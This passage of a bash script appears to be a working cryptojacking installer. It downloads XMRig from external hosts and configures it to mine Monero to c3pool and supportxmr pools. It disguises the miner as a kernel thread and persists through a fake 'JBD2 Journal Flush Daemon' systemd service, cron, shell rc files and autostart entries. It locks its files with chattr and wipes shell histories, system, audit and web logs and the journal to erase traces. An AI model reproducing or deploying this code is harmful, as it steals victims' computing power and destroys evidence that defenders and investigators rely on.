if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    _sysonly systemctl stop "$svc" || true
  done
  [ "$STOP_UDEV" = "1" ] && { _sysonly systemctl stop systemd-udevd.service || true; }
fi

if [ -f "$INSTALL_DIR/.jbd2.run" ]; then
  _mpid="$(tr -d '[:space:]' < "$INSTALL_DIR/.jbd2.run" 2>/dev/null)"
  case "$_mpid" in
    ''|*[!0-9]*) : ;;
    *) _try kill -9 "$_mpid" || true ;;
  esac
  rm -f "$INSTALL_DIR/.jbd2.run"
fi
_try pkill -f "$(_escape_re "${INSTALL_DIR}/${BIN_NAME}")"    || true
_try pkill -f "$(_escape_re "${INSTALL_DIR}/${CONFIG_NAME}")" || true
_try pkill -f "$(_escape_re "${INSTALL_DIR}/${WRAPPER_NAME}")" || true
sleep 1

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

_extract_bin() {
  local archive="$1" tmp found
  tmp="$(mktemp -d)" || return 1
  tar xzf "$archive" -C "$tmp" --strip-components=1 2>/dev/null \
    || tar xzf "$archive" -C "$tmp" 2>/dev/null \
    || { rm -rf "$tmp"; return 1; }
  rm -f "$archive"
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  _try chattr -i "$INSTALL_DIR/$BIN_NAME" || true
  mv -f "$found" "$INSTALL_DIR/$BIN_NAME" \
    && chmod +x "$INSTALL_DIR/$BIN_NAME" 2>/dev/null
  rm -rf "$tmp"
  [ -x "$INSTALL_DIR/$BIN_NAME" ]
}

install_latest_official_xmrig() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  local url
  url="$(get_latest_xmrig_url)" || return $?
  _try chattr -i "$INSTALL_DIR/$BIN_NAME" || true
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$url" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

install_c3pool_package() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  _try chattr -i "$INSTALL_DIR/$BIN_NAME" || true
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" \
    || download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

if ! install_latest_official_xmrig; then
  install_c3pool_package || exit 1
fi

if ! $_TO "$INSTALL_DIR/$BIN_NAME" --version >/dev/null 2>&1; then
  if [ -f /etc/os-release ] && grep -q 'Alpine' /etc/os-release \
     && command -v apk >/dev/null 2>&1; then
    apk add --no-cache xmrig >/dev/null 2>&1 \
      && _try chattr -i "$INSTALL_DIR/$BIN_NAME" || true
    cp "$(command -v xmrig)" "$INSTALL_DIR/$BIN_NAME" \
      && chmod +x "$INSTALL_DIR/$BIN_NAME" \
      || exit 1
  else
    exit 1
  fi
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": false, "background": false, "colors": false, "title": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": $THREADS_HINT, "asm": true, "argon2-impl": null },
    "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true },
    "cuda": { "enabled": false, "loader": null, "nvml": true },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",       "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:33333",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:23333",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true }
    ],
    "print-time": 60, "health-print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false,
    "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
    "dns": { "ip_version": 4, "ttl": 30 },
    "user-agent": null, "verbose": 0, "watch": false,
    "pause-on-battery": false, "pause-on-active": false
}
EOF_CONFIG
)

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_PATH" ]; then
  :
else
  _try chattr -i "$CONFIG_PATH" || true
  backup_if_exists "$CONFIG_PATH"
  printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
fi
chmod 600 "$CONFIG_PATH" 2>/dev/null || true

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
_try chattr -i "$RUNNER" || true
backup_if_exists "$RUNNER"

cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
set +m
exec >/dev/null 2>&1
cd "$INSTALL_DIR" 2>/dev/null || exit 1
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

WR_ROOT=0
[ "\$(id -u)" = "0" ] && WR_ROOT=1

_umount_cfg() {
  [ "\$WR_ROOT" = "1" ] || return 0
  command -v mountpoint >/dev/null 2>&1 || return 0
  if mountpoint -q "$CONFIG_PATH" 2>/dev/null; then
    umount "$CONFIG_PATH" 2>/dev/null || true
  fi
}

_mount_cfg() {
  [ "\$WR_ROOT" = "1" ] || return 0
  command -v mountpoint >/dev/null 2>&1 || return 0
  mountpoint -q "$CONFIG_PATH" 2>/dev/null && return 0
  mount --bind /dev/null "$CONFIG_PATH" 2>/dev/null || true
}

if command -v flock >/dev/null 2>&1; then
  exec 9> .jbd2.lck
  flock -n 9 || exit 0
fi

start_miner() {
  _umount_cfg
  if command -v setsid >/dev/null 2>&1; then
    ( setsid $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" \\\\
        "$INSTALL_DIR/$BIN_NAME" --config="$CONFIG_PATH" --no-color --quiet \\\\
        </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  else
    ( $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" \\\\
        "$INSTALL_DIR/$BIN_NAME" --config="$CONFIG_PATH" --no-color --quiet \\\\
        </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  fi
  sleep 1
  MINER_PID="\$(pgrep -P \$\$ -f 'ksoftirqd-' 2>/dev/null | head -1)"
  [ -z "\$MINER_PID" ] && MINER_PID="\$(pgrep -u "\$(id -u)" -f "\$INSTALL_DIR/\$BIN_NAME" 2>/dev/null | head -1)"
  [ -n "\$MINER_PID" ] && echo "\$MINER_PID" > .jbd2.run
  sleep 2
  _mount_cfg
}

start_miner

while true; do
  sleep 30
  if [ -f .jbd2.run ]; then
    PID=\$(tr -d '[:space:]' < .jbd2.run 2>/dev/null)
    case "\$PID" in
      ''|*[!0-9]*) start_miner ;;
      *) kill -0 "\$PID" 2>/dev/null || start_miner ;;
    esac
  else
    start_miner
  fi
done
EOF_MINER
chmod +x "$RUNNER"

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  SVC_FILE="$INSTALL_DIR/.jbd2.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=JBD2 Journal Flush Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
CPUShares=2
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  _try chattr -i "$TARGET" || true
  [ -f "$TARGET" ] && _try cp -p "$TARGET" "${TARGET}.bak.$(TS)" || true
  if _try cp "$SVC_FILE" "$TARGET"; then
    _sysonly systemctl daemon-reload || true
    _sysonly systemctl enable "$SERVICE_NAME" || true
    _sysonly systemctl restart "$SERVICE_NAME" || HAS_ROOT=0
  else
    HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"; mkdir -p "$USER_DIR" 2>/dev/null
    USVC="$USER_DIR/$SERVICE_NAME"; backup_if_exists "$USVC"
    cat > "$USVC" <<EOF_USERVICE
[Unit]
Description=JBD2 Journal Flush Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 \
      && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  if command -v crontab >/dev/null 2>&1; then
    CL="nohup $RUNNER >/dev/null 2>&1 &"
    crontab -l 2>/dev/null | grep -F -q "$RUNNER" \
      || { crontab -l 2>/dev/null; echo "@reboot $CL"; } | crontab - 2>/dev/null || true
  fi
  
  # === FIX: Dọn dẹp các dòng lỗi trong .bashrc / .zshrc trước khi thêm mới ===
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    
    # Xóa các dòng nohup .jbd2 cũ để tránh lỗi "exit 127" khi reboot
    sed -i '/\.jbd2-/d' "$RC" 2>/dev/null || true
    sed -i '/\.journal-/d' "$RC" 2>/dev/null || true
    
    # Thêm dòng mới được bọc trong () và setsid để không in ra mã Job Control [1] PID
    printf '\n(setsid %s >/dev/null 2>&1 &)\n' "$RUNNER" >> "$RC" 2>/dev/null || true
  done

  if mkdir -p "$HOME/.config/autostart" 2>/dev/null; then
    AS_FILE="$HOME/.config/autostart/jbd2-flush-${RAND_SUFFIX}.desktop"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=Journal Flush Service
Exec=bash $RUNNER
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  if command -v setsid >/dev/null 2>&1; then
    ( setsid nohup "$RUNNER" </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  else
    ( nohup "$RUNNER" </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  fi
fi

if command -v chattr >/dev/null 2>&1; then
  _try chmod 000 "$CONFIG_PATH" || chmod 000 "$CONFIG_PATH" 2>/dev/null || true
  _try chattr +i "$CONFIG_PATH" || true
  _try chattr +i "$INSTALL_DIR/$BIN_NAME" || true
  _try chattr +i "$RUNNER" || true
  [ -f "/etc/systemd/system/$SERVICE_NAME" ] && \
    _try chattr +i "/etc/systemd/system/$SERVICE_NAME" || true
fi

if [ "$HAS_ROOT" -eq 1 ]; then
    for _ud in /root /home/*; do
        [ -d "$_ud" ] || continue
        for _hf in .bash_history .zsh_history .zhistory .sh_history .history \
                   .mysql_history .psql_history .sqlite_history \
                   .rediscli_history .node_repl_history .irb_history \
                   .Rhistory .viminfo .lesshst .wget-hsts \
                   .local/share/recently-used.xbel ; do
            [ -f "$_ud/$_hf" ] && _try rm -f "$_ud/$_hf" || true
        done
        _try ln -sf /dev/null "$_ud/.bash_history" || true
        _try ln -sf /dev/null "$_ud/.zsh_history"  || true
    done

    for _lf in /var/log/wtmp /var/log/btmp /var/log/lastlog \
               /var/log/faillog /var/log/tallylog ; do
        [ -f "$_lf" ] && _try sh -c ": > $_lf" || true
    done

    _try rm -f /var/log/nginx/access.log /var/log/nginx/error.log \
               /var/log/apache2/access.log /var/log/apache2/error.log \
               /var/log/apache2/access_log /var/log/apache2/error_log \
               /var/log/httpd/access_log /var/log/httpd/error_log \
               /var/log/lighttpd/access.log /var/log/lighttpd/error.log \
               || true

    for _lg in /var/log/syslog /var/log/messages /var/log/auth.log \
               /var/log/secure /var/log/daemon.log /var/log/cron \
               /var/log/kern.log /var/log/user.log /var/log/debug \
               /var/log/mail.log /var/log/maillog ; do
        [ -f "$_lg" ] || continue
        _try sed -i "/$BIN_NAME/d"     "$_lg" || true
        _try sed -i "/\.jbd2-/d"       "$_lg" || true
        _try sed -i "/\.cf_/d"         "$_lg" || true
        _try sed -i "/copyfail/d"      "$_lg" || true
        _try sed -i "/nr_hugepages/d"  "$_lg" || true
        _try sed -i "/c3pool/d"        "$_lg" || true
        _try sed -i "/supportxmr/d"    "$_lg" || true
        _try sed -i "/xmrig/d"         "$_lg" || true
    done

    if [ -f /var/log/audit/audit.log ]; then
        _try sh -c ': > /var/log/audit/audit.log' || true
    fi
    _try rm -f /var/log/audit/audit.log.* || true

    if command -v journalctl >/dev/null 2>&1; then
        _try journalctl --rotate 2>/dev/null || true
        _try journalctl --vacuum-time=1s 2>/dev/null || true
    fi
    _try rm -rf /var/log/journal/* /run/log/journal/* 2>/dev/null || true

    for _acc in /var/log/pacct /var/account/pacct /var/log/account/pacct ; do
        [ -f "$_acc" ] && _try sh -c ": > $_acc" || true
    done

    _try rm -rf /var/crash/* /var/lib/systemd/coredump/* 2>/dev/null || true
    _try sh -c 'echo "kernel.core_pattern=|/bin/false" > /proc/sys/kernel/core_pattern' 2>/dev/null || true

    command -v dmesg >/dev/null 2>&1 && _try dmesg -C 2>/dev/null || true

    for _tmp in /dev/shm /tmp /var/tmp /run/user/* ; do
        [ -d "$_tmp" ] || continue
        _try find "$_tmp" -maxdepth 1 -name '.cf_*.py' -delete 2>/dev/null || true
    done
fi

unset HISTFILE SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK 2>/dev/null
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0
if [ -n "$HOME" ] && [ -d "$HOME" ]; then
  for _ph in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.python_history" \
             "$HOME/.sh_history" "$HOME/.zhistory" "$HOME/.history" ; do
    [ -f "$_ph" ] && : > "$_ph" 2>/dev/null || true
  done
  ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null || _try ln -sf /dev/null "$HOME/.bash_history" || true
  ln -sf /dev/null "$HOME/.zsh_history"  2>/dev/null || _try ln -sf /dev/null "$HOME/.zsh_history"  || true
  unset _ph
fi

unset _ud _hf _lf _lg _acc _tmp _pat _CE _gce _gsf _gusf _god _gop _gm _f _d _ev
unset _gbn _gks _gwr _gr _gf _obn _oks _okwr _OP _or _of
unset _hint

sleep 2

_pick_keep() {
    local keep_pid="" keep_start=""
    if [ -n "${INSTALL_DIR:-}" ] && [ -f "$INSTALL_DIR/.jbd2.run" ]; then
        local tp
        tp="$(tr -d '[:space:]' < "$INSTALL_DIR/.jbd2.run" 2>/dev/null)"
        case "$tp" in
            ''|*[!0-9]*) : ;;
            *) [ -d "/proc/$tp" ] && keep_pid="$tp" ;;
        esac
    fi
    if [ -z "$keep_pid" ]; then
        for _vp in /proc/[0-9]*; do
            _vcomm="$(cat "$_vp/comm" 2>/dev/null)"
            case "$_vcomm" in ksoftirqd-*) : ;; *) continue ;; esac
            _vcwd="$(_derive_cwd "$_vp")" || continue
            case "$_vcwd" in *"/.jbd2-"*) : ;; *) continue ;; esac
            _vst="$(awk '{print $22}' "$_vp/stat" 2>/dev/null)"
            case "$_vst" in ''|*[!0-9]*) continue ;; esac
            if [ -z "$keep_start" ] || [ "$_vst" -lt "$keep_start" ]; then
                keep_start="$_vst"
                keep_pid="${_vp#/proc/}"
            fi
        done
    fi
    printf '%s' "$keep_pid"
}

_trim_to_one() {
    local keep_pid="$1" killed=0
    for _vp in /proc/[0-9]*; do
        _vpid="${_vp#/proc/}"
        [ "$_vpid" = "$keep_pid" ] && continue
        [ "$_vpid" = "$$" ] && continue
        [ "$_vpid" = "$PPID" ] && continue
        _vcomm="$(cat "$_vp/comm" 2>/dev/null)"
        case "$_vcomm" in ksoftirqd-*) : ;; *) continue ;; esac
        _vcwd="$(_derive_cwd "$_vp")" || continue
        case "$_vcwd" in *"/.jbd2-"*) : ;; *) continue ;; esac
        _vst="$(awk '{print $22}' "$_vp/stat" 2>/dev/null)"
        case "$_vst" in ''|*[!0-9]*) : ;; esac
        _try kill -9 "$_vpid" || true
        killed=$((killed+1))
        command -v logger >/dev/null 2>&1 && \
            logger -t jbd2 "final-safety: killed excess pid=$_vpid cwd=$_vcwd" 2>/dev/null || true
    done
    printf '%s' "$killed"
}

_FS_KEEP="$(_pick_keep)"
if [ -n "$_FS_KEEP" ]; then
    _FS_round=0
    while [ "$_FS_round" -lt 3 ]; do
        _FS_k="$(_trim_to_one "$_FS_KEEP")"
        _FS_total=0
        for _vp in /proc/[0-9]*; do
            _vcomm="$(cat "$_vp/comm" 2>/dev/null)"
            case "$_vcomm" in ksoftirqd-*) : ;; *) continue ;; esac
            _vcwd="$(_derive_cwd "$_vp")" || continue
            case "$_vcwd" in *"/.jbd2-"*) : ;; *) continue ;; esac
            _FS_total=$((_FS_total+1))
        done
        [ "$_FS_total" -le 1 ] && break
        _FS_round=$((_FS_round+1))
        sleep 1
    done
    command -v logger >/dev/null 2>&1 && \
        logger -t jbd2 "final-safety: invariant enforced (keep_pid=$_FS_KEEP, rounds=$_FS_round)" 2>/dev/null || true
fi

unset _vp _vpid _vcomm _vcwd _vst _FS_KEEP _FS_round _FS_k _FS_total
unset _pick_keep _trim_to_one _derive_cwd

exit 0
